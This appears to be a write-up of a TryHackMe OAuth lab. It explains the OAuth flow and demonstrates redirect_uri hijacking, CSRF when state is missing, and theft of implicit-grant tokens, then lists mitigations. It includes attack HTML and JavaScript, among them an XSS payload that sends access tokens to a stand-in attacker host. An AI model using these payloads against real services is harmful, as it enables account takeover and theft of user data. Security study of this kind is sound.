# OAuth Vulnerabilities

some examples of OAuth Service providers:

![oAuth Service provider](/img/oAuth/1.png)

## 1. How OAuth Flow Works

![img](/img/oAuth/2.png)

### Scenario

In this scenario, the `CoffeeShopApp` (i.e., `http://coffee.thm:8000/`) is the third-party OAuth service provider, and the `Bistro Website` (i.e., `http://bistro.thm:8000/`) allows users to log in via the `CoffeeShopApp`.

![img](/img/oAuth/3.png)

After clicking on `Login with OAuth` the bistro website redirect the user to:

`http://coffee.thm:8000/accounts/login/?next=/o/authorize/%3Fclient_id%3Dzlurq9lseKqvHabNqOc2DkjChC000QJPQ0JvNoBt%26response_type%3Dcode%26redirect_uri%3Dhttp%3A//bistro.thm%3A8000/oauthdemo/callback`

The bistro website initiates this process by redirecting the user to the authorization server with the following parameters included in the URL:

* `response_type=code`: This indicates that `CoffeeShopApp` is expecting an authorization code in return.
* `state`: A CSRF token to ensure that the request and response are part of the same transaction.
* `client_id`: A public identifier for the client application, uniquely identifying `CoffeeShopApp`.
* `redirect_uri`: The URL where the authorization server will send the user after he grants permission. This must match one of the pre-registered redirect URIs for the client application.
* `scope`: Specifies the level of access requested, such as viewing coffee orders.

By including these parameters, the bistro app ensures that the authorization server understands what is requested and where to send the user afterwards. Here is the Python code that redirects the user to the authorization server:

```python
def oauth_login(request):
    app = Application.objects.get(name="CoffeeApp")
    redirect_uri = request.GET.get("redirect_uri", "http://bistro.thm:8000/oauthdemo/callback")
    
    authorization_url = (
        f"http://coffee.thm:8000/o/authorize/?client_id={app.client_id}&response_type=code&redirect_uri={redirect_uri}"
    )
    return redirect(authorization_url)
```

### Authentication & Authorization

When the user reaches the authorization server, they are prompted to log in using their credentials. This step allows the server to verify their identity. In many real-world cases, however, the user is already logged in to the service (for example, Google), so they do not need to re-enter their credentials and are taken directly to the consent screen.

After successfully authenticating (or if an active session already exists), the authorization server asks whether the user agrees to grant the bistro app access to specific details. This consent step is crucial, as it provides transparency and gives the user control over which applications can access their data.

![img](/img/oAuth/4.png)

### Authorization Response

If the user agrees to grant access, the authorization server generates an authorization code. The server then redirects the user to the bistro website using the specified `redirect_uri`. The redirection includes the authorization code and the original state parameter to ensure the integrity of the flow.

The authorization server responds with the following:

* `code`: `CoffeeShopApp` will use the authorisation code to request an access token.
* `state`: The CSRF token previously sent by `CoffeeShopApp` to validate the response.

An example authorization response would be `https://bistro.thm:8000/callback?code=AuthCode123456&state=xyzSecure123`.

This step ensures the authorization process is secure and the response is linked to the bistro's initial request. The authorization code is a temporary credential that the Bistro website will exchange for an access token. This access token allows the Bistro website to access the user's profile details from `CoffeeShopApp`.

### Token Request

The bistro website exchanges the authorization code for an access token by requesting the authorization server’s token endpoint through a POST request with the following parameters:

* `grant_type`: type of grant being used; usually, it's set as `code` to specify authorization code as the grant type.
* `code`: The authorization code received from the authorization server.
* `redirect_uri`: This must match the original redirect URI provided in the authorization request.
* `client_id and client_secret`: Credentials for authenticating the client application.

Using the above parameters, the following code will make a token request to `/o/token` endpoint.

```python
token_url = "http://coffee.thm:8000/o/token/"
    client_id = Application.objects.get(name="CoffeeApp").client_id
    client_secret = Application.objects.get(name="CoffeeApp").client_secret
    redirect_uri = request.GET.get("redirect_uri", "http://bistro.thm:8000/oauthdemo/callback")
    
    data = {
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": redirect_uri,
        "client_id": client_id,
        "client_secret": client_secret,
    }
    
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Authorization': f'Basic {base64.b64encode(f"{client_id}:{client_secret}".encode()).decode()}',
    }
    
    response = requests.post(token_url, data=data, headers=headers)
    tokens = response.json()
```

The bistro app securely exchanges the authorization code for an access token by sending this request. The authorization server will verify the information provided, ensuring the request is valid and originates from the client requesting the authorization code. If everything is correct, the authorization server will respond with the access token, allowing the bistro website to proceed with accessing user's profile details.

### Token Response

The authorization server authenticates the bistro website and validates the authorization code. Upon successful validation, the server responds with an `Access Token` and, optionally, a `Refresh Token`.

The authorization server's response includes the following:

* `access_token`: Token that will be used to access user's details.
* `token_type`: Typically "Bearer".
* `expires_in`: The duration in seconds for which the access token is valid.
* `refresh_token` (optional): A token used to obtain new access tokens without requiring the user to log in again.

With the access token, the bistro website can now authenticate requests to the resource server to access user's profile details. The optional refresh token can be used to request a new access token once the current one expires, providing a seamless user experience by avoiding the need for user to log in repeatedly.

The bistro website has completed the OAuth 2.0 authorization workflow with the access token. This token is a credential allowing the app to access protected resources on user's behalf. Now, the bistro website can make authenticated requests to the resource server to retrieve user's profile. Each request to the resource server includes the access token in the authorization header, ensuring that the server recognizes and permits the access.

---

## 2. Identifying the OAuth Services

The first indication that an application uses OAuth is often found in the login process. Look for options allowing users to log in using external service providers like Google, Facebook, and GitHub. These options typically redirect users to the service provider's authorization page, which strongly signals that OAuth is in use.

### Detecting OAuth Implementation

When analyzing the network traffic during the login process, pay attention to HTTP redirects. OAuth implementations will generally redirect the browser to an authorization server's URL. This URL often contains specific query parameters, such as `response_type`, `client_id`, `redirect_uri`, `scope`, and `state`. These parameters are indicative of an OAuth flow in progress. For example, a URL might look like `https://dev.coffee.thm/authorize?response_type=code&client_id=AppClientID&redirect_uri=https://dev.coffee.thm/callback&scope=profile&state=xyzSecure123`

### Identifying the OAuth Framework

Once you have confirmed that OAuth is being used, the next step is to identify the specific framework or library the application employs. This can provide insights into potential vulnerabilities and the appropriate security assessments. Here are some strategies to identify the OAuth framework:

* **HTTP Headers and Responses:** Inspect HTTP headers and response bodies for unique identifiers or comments referencing specific OAuth libraries or frameworks.
* **Source Code Analysis:** If you can access the application's source code, search for specific keywords and import statements that can reveal the framework in use. For instance, libraries like `django-oauth-toolkit`, `oauthlib`, `spring-security-oauth`, or `passport` in `Node.js`, each have unique characteristics and naming conventions.
* **Authorization and Token Endpoints:** Analyze the endpoints used to obtain authorization codes and access tokens. Different OAuth implementations might have unique endpoint patterns or structures. For example, the `Django OAuth Toolkit` typically follows the pattern `/oauth/authorize/` and `/oauth/token/`, while other frameworks might use different paths.
* **Error Messages:** Custom error messages and debug output can inadvertently reveal the underlying technology stack. Detailed error messages might include references to specific OAuth libraries or frameworks.

---

## 3. Exploiting OAuth – Stealing OAuth Tokens

In the Authorization Code flow, after successful authorization, the authorization server sends an **authorization code** to the client application via the `redirect_uri`. This code is later exchanged for an access token at the token endpoint. Because the authorization code is a temporary credential that can be exchanged for an access token, protecting the `redirect_uri` is critical.

The `redirect_uri` must be pre-registered in the authorization server’s application settings. During the OAuth flow, the authorization server strictly validates that the supplied `redirect_uri` exactly matches one of the registered URIs. If it does not match, the request is rejected. This validation prevents open redirect and token leakage vulnerabilities.

For example, the image below shows the list of registered redirect URIs for the OAuth application:

![Registered Redirect URIs](/img/oAuth/5.png)

If an attacker gains control over one of these registered domains (such as `dev.bistro.thm`), they can specify `http://dev.bistro.thm/callback` as the `redirect_uri` during the OAuth flow. After the user authorizes the application, the authorization server will send the authorization code to that controlled endpoint.

The attacker can then capture this authorization code and exchange it at the token endpoint for an access token. Because access tokens are bearer tokens, possession alone is sufficient to access protected resources. This allows the attacker to impersonate the victim and retrieve sensitive data.

Common causes of this vulnerability include:

* Overly broad or wildcard redirect URI registrations
* Subdomain takeover of a registered domain
* Weak redirect URI validation (e.g., prefix matching instead of exact matching)
* Client-side handling of user-controlled `redirect_uri` parameters without strict validation

### Preparing the Payload (Attacker Perspective)

Assume the attacker has gained control over the registered subdomain `dev.bistro.thm:8002` and can host arbitrary HTML content on it.

The attacker creates a malicious page (`redirect_uri.html`) with the following code:

```html
<form action="http://bistro.thm:8000/oauthdemo/oauth_login/" method="get">
    <input type="hidden" name="redirect_uri" value="http://dev.bistro.thm:8002/malicious_redirect.html">
    <input type="submit" value="Hijack OAuth">
</form>
```

This form sends a crafted `redirect_uri` parameter to the Bistro website’s `oauth_login` endpoint. Because the Bistro application reads the `redirect_uri` from user-controlled input, it constructs the authorization request using the attacker-supplied redirect URI.

The Bistro site then redirects the victim’s browser to the authorization server (`coffee.thm`) with this malicious `redirect_uri`.

After the victim authenticates and grants consent, the authorization server redirects the browser to:

```bash
http://dev.bistro.thm:8002/malicious_redirect.html?code=AuthCode123&state=xyz
```

Since the attacker controls this domain, they can extract the authorization code using JavaScript:

```html
<script>
const urlParams = new URLSearchParams(window.location.search);
const code = urlParams.get('code');
console.log("Intercepted Authorization Code:", code);
// Store the code server-side for later use
</script>
```

Because the attacker controls the subdomain, they can store the intercepted authorization code in a database or file for later use. The redirection can occur quickly, potentially without the victim noticing the interception.

The attacker can distribute the link (`http://dev.bistro.thm:8002/redirect_uri.html`) through social engineering or CSRF techniques. When the victim clicks “Hijack OAuth,” the OAuth flow is initiated with the attacker-controlled `redirect_uri`.

### Important Technical Clarification

Intercepting the authorization code alone is not always sufficient to obtain an access token.

In the Authorization Code flow, the code is bound to:

* The `client_id`
* The original `redirect_uri`
* And, in secure implementations, the `client_secret` (or PKCE verifier)

To successfully exchange the intercepted code for an access token, one of the following must be true:

1. The client is a public client that does not require a client secret.
2. The attacker has obtained the client’s `client_secret`.
3. The implementation is misconfigured and does not properly validate the client credentials.
4. The attacker replays the code through a vulnerable client endpoint that performs the token exchange on their behalf.

In the TryHackMe lab scenario, the `/callbackforflag/` endpoint likely performs the token exchange without strict validation, allowing the attacker to supply the intercepted code and receive a valid access token.

Example:

```bash
http://coffee.thm:8000/oauthdemo/callbackforflag/?code=xxxxx
```

If this endpoint exchanges the code without properly verifying the legitimate client context, the attacker can obtain a valid access token and access protected resources.

### Why This Works

This attack succeeds due to a combination of:

* User-controlled `redirect_uri` handling in the client application
* A registered redirect URI that is attacker-controlled (e.g., subdomain takeover)
* Weak validation during token exchange

OAuth itself is not broken here. The implementation is.

The vulnerability emerges from mismanaging trust boundaries — specifically allowing sensitive redirection targets to be influenced externally and failing to tightly bind authorization codes to legitimate clients.

---

## 4. Exploiting OAuth – CSRF in OAuth (Missing `state` Parameter)

In this scenario, `mycontacts.thm:8080` is the **client application**. It allows users to sync their contacts with the CoffeeShop OAuth provider hosted at `coffee.thm:8000`.

After successful OAuth linking, the application automatically performs **contact synchronization**.

This assumption is critical:

If an attacker can force their own CoffeeShop account to be linked to a victim’s session on `mycontacts.thm`, the victim’s contacts will be synced into the attacker’s account.

### **Role of the `state` Parameter**

In the Authorization Code flow:

1. The client (`mycontacts.thm`) redirects the user to the authorization server (`coffee.thm`).
2. The user authenticates and grants consent.
3. The authorization server redirects back to the client’s `redirect_uri` with:

```bash
?code=AUTH_CODE
```

To prevent CSRF, OAuth requires the `state` parameter.

The `state` parameter:

* Is cryptographically random
* Is generated per authorization attempt
* Is stored in the user’s session
* Is returned unchanged in the callback
* Must be strictly validated

If `state` is missing, the client cannot verify whether the authorization response belongs to the user who initiated the flow.

Example vulnerable request from `mycontacts.thm`:

```bash
http://coffee.thm:8000/o/authorize/?response_type=code&client_id=kwoy5pKgHOn0bJPNYuPdUL2du8aboMX1n9h9C0PN&redirect_uri=http://mycontacts.thm:8080/csrf/callbackcsrf.php
```

Missing:

```bash
&state=<random_value>
```

Without `state`, the callback endpoint will accept any valid authorization code.

### **Exploiting the Vulnerability**

This is an **OAuth CSRF (account linking) attack**.

The attacker does not steal the victim’s authorization code.

Instead, the attacker injects their own valid authorization code into the victim’s session.

Because the application automatically syncs contacts after linking, the victim’s contacts will be transferred to the attacker’s CoffeeShop account.

**Attacker's Perspective:**

The attacker logs into the OAuth provider (`coffee.thm`) using their own account.

They initiate a normal OAuth authorization flow targeting the legitimate callback:

```bash
http://coffee.thm:8000/o/authorize/?response_type=code&client_id=kwoy5pKgHOn0bJPNYuPdUL2du8aboMX1n9h9C0PN&redirect_uri=http://mycontacts.thm:8080/csrf/callbackcsrf.php
```

After successful authentication and consent, the authorization server redirects the browser to:

```bash
http://mycontacts.thm:8080/csrf/callbackcsrf.php?code=ATTACKER_CODE
```

Since the attacker needs the authorization code before it is consumed by the client application, they intercept it using:

* **Burp Suite (proxy interception)**
* OWASP ZAP
* Browser developer tools (Network tab)
* Or by manually copying it from the redirected URL

The attacker extracts:

```bash
ATTACKER_CODE
```

They then craft a malicious link:

```bash
http://mycontacts.thm:8080/csrf/callbackcsrf.php?code=ATTACKER_CODE
```

This is the payload sent to the victim.

**Client's Perspective:**

The attacker delivers the malicious link via phishing, social engineering, or any delivery mechanism.

If the victim is logged into `mycontacts.thm` and clicks the link:

1. The client receives the `code` parameter.
2. The client exchanges the attacker’s code at the token endpoint.
3. The attacker’s CoffeeShop account becomes linked to the victim’s session.
4. The application performs automatic contact synchronization.
5. The victim’s contacts are synced into the attacker’s CoffeeShop account.

No credentials are stolen.
No sessions are hijacked.
The authorization server behaves correctly.

The failure exists entirely in the client’s lack of `state` validation.

---

## 5. Exploiting OAuth – Implicit Grant Token Theft

In this scenario:

* `factbook.thm:8080` → **Client application**
* `coffee.thm:8000` → **Authorization server**
* The application syncs user statuses from CoffeeShopApp.
* The client uses the **Implicit Grant Flow** (`response_type=token`).

Unlike the Authorization Code flow, the implicit grant returns the **access token directly to the browser**, without an intermediate authorization code exchange.

This design was intended for public clients (e.g., single-page applications) that cannot securely store a client secret. However, returning tokens directly to the browser introduces significant security risks.

### How the Flow Works

The client constructs the authorization request:

```javascript
var client_id = 'npmL7WDiRoOvjZoGSDiJhU2ViodTdygjW8rdabt7';
var redirect_uri = 'http://factbook.thm:8080/callback.php'; 
var auth_url = "http://coffee.thm:8000/o/authorize/";
var url = auth_url + "?response_type=token&client_id=" + client_id + "&redirect_uri=" + encodeURIComponent(redirect_uri);
window.location.href = url;
```

Key detail:

```bash
response_type=token
```

After authentication, the authorization server redirects the user to:

```bash
http://factbook.thm:8080/callback.php#access_token=ACCESS_TOKEN&token_type=Bearer&expires_in=36000
```

The access token is returned in the **URL fragment** (after `#`).

Important:

* URL fragments are not sent to the server.
* They are accessible via JavaScript (`window.location.hash`).

This becomes dangerous if the page contains an XSS vulnerability.

### Core Weaknesses of the Implicit Grant

* **Token exposed in URL fragment** – Any script on the page can read it.
* **No proof-of-possession** – Possession of the token is enough to authenticate.
* **Insecure client-side storage** – Tokens stored in `localStorage` or `sessionStorage` are accessible to XSS.
* **No HTTPS enforcement** – Tokens can be intercepted via man-in-the-middle attacks.

Because of these issues, modern OAuth security guidance recommends **deprecating the implicit flow** in favor of Authorization Code + PKCE.

### Vulnerability in This Lab

The `callback.php` page on `factbook.thm` includes a status submission form.

The status input field is vulnerable to **Cross-Site Scripting (XSS)**.

Since the access token is present in the URL fragment, any injected script can extract and exfiltrate it.

### Exploitation (Token Exfiltration via XSS)

The attacker’s objective is to:

1. Extract the access token from `window.location.hash`.
2. Send it to an attacker-controlled server.

The attacker starts a listener:

```bash
python3 -m http.server 8081
```

Malicious payload:

```html
<script>
var hash = window.location.hash.substr(1);
var result = hash.split('&').reduce(function (res, item) {
    var parts = item.split('=');
    res[parts[0]] = parts[1];
    return res;
}, {});
var accessToken = result.access_token;
var img = new Image();
img.src = 'http://ATTACKBOX_IP:8081/steal_token?token=' + accessToken;
</script>
```

Execution logic:

* The script reads the fragment.
* Parses key-value pairs.
* Extracts `access_token`.
* Creates an image request to the attacker’s server.
* The browser sends the token in a GET request.

Server log example:

```bash
GET /steal_token?token=2aauviER3lUOev8wNmXQ9B4GNUoadE
```

The attacker now possesses a valid **Bearer token**.

Since bearer tokens require no additional proof, possession equals authorization.

---

## 6. Additional OAuth 2.0 Vulnerabilities

Beyond common OAuth misconfigurations (e.g., open redirects, CSRF in redirect URIs, implicit flow misuse), several other critical weaknesses frequently appear during security assessments.

### 6.1 Insufficient Token Expiry

Access tokens with long or non-expiring lifetimes are a serious security flaw.

If an attacker steals such a token, they can access protected resources indefinitely. Since OAuth uses bearer tokens (whoever holds it, uses it), a long-lived token is effectively a long-lived master key.

Mitigation:

* Use short-lived access tokens.
* Issue refresh tokens with proper rotation.
* Implement refresh token reuse detection.

Short expiry reduces blast radius. Time is a defensive boundary.

### 6.2 Replay Attacks

A replay attack occurs when an attacker captures a valid token and reuses it to access protected resources.

Since bearer tokens do not prove who is using them, any reused token remains valid unless additional controls exist.

Mitigation:

* Use nonce values (unique random values per request).
* Enforce timestamp validation.
* Detect abnormal reuse patterns.
* Use sender-constrained tokens (e.g., DPoP or MTLS in advanced setups).

If the protocol cannot distinguish “original request” from “copied request,” replay becomes trivial.

### 6.3 Insecure Token Storage

Improper storage is one of the most common real-world failures.

Examples of insecure storage:

* `localStorage`
* `sessionStorage`
* Plaintext files
* Unencrypted mobile app storage

These are highly accessible to XSS or malware.

Mitigation:

* Use Secure, HttpOnly cookies (when architecture allows).
* Encrypt tokens at rest.
* Avoid exposing tokens to JavaScript when unnecessary.
* Implement proper Content Security Policy (CSP).

The implicit flow historically worsened this problem because tokens were directly exposed to browser JavaScript.

---

## Evolution and Security Improvements in OAuth 2.1

OAuth 2.1 is not a brand-new protocol. It is a consolidation of OAuth 2.0 combined with years of accumulated security best practices.

OAuth 2.0 was intentionally flexible. That flexibility made adoption easy — but it also allowed insecure design patterns. Many of the real-world vulnerabilities seen in penetration testing stem not from cryptographic weaknesses, but from optional security controls being ignored or poorly implemented.

OAuth 2.1 tightens those rules.

The most significant change is the deprecation of the Implicit Grant flow. Returning access tokens directly in URL fragments exposed them to browser-based attacks, particularly XSS. OAuth 2.1 removes this flow entirely due to token exposure risks and lack of strong client verification.

Instead, OAuth 2.1 requires the Authorization Code flow with PKCE (Proof Key for Code Exchange) for public clients. PKCE protects against authorization code interception attacks by binding the code exchange to the original client.

The `state` parameter is now mandatory to mitigate CSRF attacks. This removes ambiguity around whether CSRF protection is optional — it is not.

Redirect URI validation rules are also strengthened. Exact matching is emphasized to prevent open redirect and token leakage vulnerabilities. Wildcard-based redirect patterns are strongly discouraged.

OAuth 2.1 further improves guidance around token handling. It explicitly warns against storing tokens in `localStorage`, due to XSS risks, and recommends secure handling mechanisms such as HttpOnly secure cookies when architecture permits.

Finally, it clarifies scope validation and client authentication requirements to reduce inconsistent or insecure implementations.

The broader lesson is simple: security advice that is “optional” eventually becomes mandatory. OAuth 2.0 did not suddenly become insecure — developers misused its flexibility. OAuth 2.1 narrows that flexibility and removes patterns that consistently led to exploitation.

In real-world pentesting, OAuth failures are rarely mathematical failures. They are logic flaws, validation weaknesses, or token handling mistakes.

OAuth is not broken. Poor implementations are.

That distinction is fundamental to understanding modern authentication security.

---
